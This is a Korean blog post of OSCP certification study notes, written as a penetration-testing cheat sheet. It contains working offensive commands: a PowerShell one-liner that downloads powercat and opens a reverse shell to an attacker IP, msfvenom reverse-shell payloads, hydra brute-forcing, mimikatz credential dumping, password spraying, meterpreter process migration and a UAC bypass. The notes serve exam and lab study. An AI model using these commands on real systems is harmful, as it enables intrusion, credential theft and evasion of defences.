---
layout: post
title: OSCP
subtitle: OSCP 자격증 시험 준비를 위한 정리
author: g3rm
categories: Certificate
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - OSCP
  - Kali_Linux
  - Offsec
sidebar:
---
## Flow
기본적으로 [정보 수집 > 취약점 스캔 > 권한 상승 > 다른 머신 침투] 의 틀을 가지고 있다.   
> 주로 Nmap 선에서 끝나는 것 같지만, 수동 정보 수집도 중요하니 막힐 땐 최대한 정보를 모아야 한다.   

## CheatSheet
OSCP 자격증 공부를 하면서 자주 사용하는 명령어 정리
### Nmap
#### TCP & UDP Port Scan

#### NSE Use

### DNS Enum

### SMB Enum

### SMTP Enum

### SNMP Enum

### WEB
#### Gobuster
#### Command Injection
```
# Window 일때, cmd, PowerShell 구분 / PetSerAl 검색
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

# ps1 다운 후 실행
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.000.000/powercat.ps1");powercat -c 192.168.000.000 -p 4444 -e powershell
```

### Password
사용할 워드리스트 위치 :  `/usr/share/wordlists/`

#### Wordlist 변형
각종 rule 위치 : `/usr/share/hashcat/rules/`
```shell
# 특정 앞자리 제거
sed -i '/^1/d' password.txt

# 규칙들 (한줄로 작성 시 한번에 적용 / 여러줄로 작성 시 각각 적용)
$1 -> 뒤에 1 추가 / c -> 앞문자 대문자로


# 규칙 생성 및 적용
echo \$1 > password.rule
hashcat -r demo.rule --stdout password.txt
```
#### hydra
```shell
# user명 알때
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<ip>

# password 알때
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "password" rdp://<ip>

# HTTP Post http-post-form 경로:파라미터:실패 시 문자열
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.000.000 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

#### NTLM
#### HashCat

### Window
#### Info Gather
```Powershell
# KeePass Password
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue


```
#### Binary Hijacking
#### DLL Hijacking
#### Incorrect Path

### Linux
#### Info Gather
#### Cron Jobs Abuse
#### Setuid Abuse
#### Sudo Abuse

#### Kernel Vuln Use

### Port Forwarding & Tunneling
#### Port Forwarding

#### SSH Tunneling
#### HTTP Tunneling
#### DNS Tunneling

### Active Directory

#### 정보 수집
```powershell
# domain 사용자 출력
net user /domain
net user <username> /domain

# domain group 출력
net group /domain
net group <groupname> /domain

# current domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name # 속성 추출

# DN 검색
([adsi]'').distinguishedName
```

##### .NET 클래스 이용
```ps1
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()
}
```

```Powershell
# 모든 그룹 나열
LDAPSearch -LDAPQuery "(objectclass=group)"

# 특정 그룹 검색
$test = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Test LDAP))"
$test.properties.member
```

##### PowerView 이용
```Powershell
Import-Module .\PowerView.ps1

# 오류 메시지 받기
-Verbose

# 도메인
Get-NetDomain

# 유저
Get-NetUser | select <속성>

# 그룹
Get-NetGroup <그룹> | select <속성>

# 도메인 컨트롤러 정보 확인
Get-NetDomainController

# 도메인 정책 확인
Get-DomainPolicy

# 시스템 권한 확인
(Get-DomainPolicy)."system access"

# 컴퓨터 열거
Get-NetComputer | select operatingsystem,dnshostname

# 해당 유저의 관리자 권한 컴퓨터 찾기
Find-LocalAdminAccess

# 세션 찾기 권한 확인 및 찾기
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
Get-NetSession -ComputerName <컴퓨터이름>
## 권한이 없을 경우 + Remote Registry 켜져있을 때 사용
.\PsLoggedon.exe \\<컴퓨터이름> 

# 계정에 연결된 SPN 확인
setspn -L <계정명>
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# 유저 권한 확인
Get-ObjectAcl -Identity <계정명>

# SID 변환
Convert-SidToName <SID>
<SID1>,<SID2> | Convert-SidToName

# GenericAll 권한인 유저들 출력
Get-ObjectAcl -Identity <그룹> | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

# 도메인 공유 출력
Find-DomainShare
```

##### BloodHound
```powershell
# SharpHound로 분석할 데이터 만들기
# 사용법
Get-Help Invoke-BloodHound

# 전체 조사
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\<경로> -OutputPrefix <zip파일 접두사>

# BloodHound 환경설정
# default account - neo4j:neo4j
sudo apt install bloodhound
sudo neo4j start
bloodhound

```

#### Auth Attack
```powershell
# mimikatz로 우선 해쉬 얻어야함 / 
privilege::debug
sekurlsa::logonpasswords
# dir \\web04.corp.com\backup 사용 시 티켓이 생성되며 캐시되어 얻을 수 있음
sekurlsa::tickets
# 정책 가져오기
net accounts

# Password Spray 3가지 기법
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
crackmapexec smb 192.168.50.0/24 -u users.txt -p <password> -d <domain> --continue-on-success
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

### Metasploit
#### msfconsole
Nmap 및 공격 성공 시 얻는 세션 등 다양한 것들을 공유하여 사용할 수 있어 초기화 및 워크스페이스 생성 후 사용하는 것이 좋다.   
자동화 코드 위치 : /usr/share/metasploit-framework/scripts/resource   

```Shell
# 초기화 및 접속
sudo msfdb (re)init
sudo systemctl enable postgresql
sudo msfconsole -r <자동화 스크립트>

# 워크스페이스 생성
workspace -a pen200

# Nmap 사용
db_nmap <기존 Nmap 옵션>
hosts
services

# 보조모듈 나열 exploits, payloads, auxiliary 등등 있음
show -h

# 검색
search type:<보조모듈> <검색어>
search type:auxiliary ssh
search Apache 2.4.49

# payload 검색
show payloads
set payloads <번호>

# 사용 및 세팅
use <번호>
show options
set <option> <value> / unset <option>
services -p 445 --rhosts # db_name으로 정보가 있다면 사용 가능
run

# 공격 성공하여 얻은 정보/세션들
creds
sessions / sessions -i <번호>

# nc 안될 때, multi/handler 사용
use multi/handler

# route 관련
route add <subnet> <sessionId>
route add 172.16.1.0/24 12

route print
route flush

# 포트포워딩
portfwd add -l 3389 -p 3389 -r 172.16.000.000

# session background
Ctrl+z 
```

#### msfvenom
https://github.com/puckel/Cheatsheets/blob/master/Cheatsheet_MetasploitPayloads.txt 참고   
```shell
# payloads 리스트 출력
msfvenom -l payloads --platform windows --arch x64

# payload 생성
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe

# web reverse shell
msfvenom -p php/reverse_php LHOST=192.168.45.241 LPORT=9999 -f raw -o php_reverse_9999.pHP
cat php_reverse_9999.pHP | pbcopy && echo '<?php ' | tr -d '\n' > php_reverse_9999.pHP && pbpaste >> php_reverse_9999.pHP
```

#### meterpreter
multi/handler 혹은 meterpreter 가 포함된 reverse shell로 공격하여 쉘 얻을 시
``` shell
# shell 얻기
shell

# 기존 명령어 사용
l<linux명령어> / lpwd / lcat ...

# 파일 관련
download <경로>
upload <칼리경로> <피해자경로>

# 유저 얻기
getuid

# 시스템 정보 얻기
sysinfo

# 권한상승 / SeImpersonatePrivilege 권한 필요
getsystem

# 프로세스 보기
ps

# 환경변수 보기
getenv <변수명>

# 리버스 쉘 .exe 프로세스를 특정 프로세스 하위로 마이그레이션
migrate <위장할PID>

# 프로세스 만들기
execute -H -f notepad

# background
bg
```

### Etc
#### RDP 접근
``` shell
xfreerdp /drive:test,/home/kali/offsec /u:nadine /p:123abc /v:192.168.145.227

# Remote Desktop Users 또는 Remote Management Users  권한 없는 유저 접근 법
runas /user:backupadmin cmd
```
#### SSH 접근
```shell
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" User@IP
```
#### FTP 접근
```shell
# 기본적인 FTP 접근 
ftp <IP> 

# 파일 디렉토리 탐색 
pwd # 현재 작업 디렉토리 표시 
cd <dir_name> # 특정 디렉토리 이동 
ls # 현재 디렉토리 파일 및 폴더 목록 표시 (dir도 가능) 

# 파일 전송 
get <file_name> # 로컬에 파일 다운로드 
mget <file1 file2 ..> # 로컬에 다수 파일 다운로드 
put <file_name> # 서버에 파일 업로드 
mput <file1 file2 ...> # 서버에 다수 파일 업로드 

# 파일 조작 
delete  
```
#### Netcat
```shell
nc -nvlp <port>
nc <ip> <port>
```

#### Python File Download
```shell
# Python server start
python3 -m http.server 80

# Window
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe

# Linux
curl http://192.168.48.3/adduser.exe
```

#### UAC Bypass
무결성이 높음이여야 UAC에 안걸리기에 **sdclt.exe**를 자주 이용하여 우회   
우회 성공 시 kiwi를 사용할 수 있다.   
> OSCP에는 안나올 가능성이 크지만, 그래도 정리   
```shell
# 무결성 확인
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel

# msfconsole 이용해서 우회...
search UAC
use exploit/windows/local/bypassuac_sdclt

# kiwi 사용
load kiwi
help
```
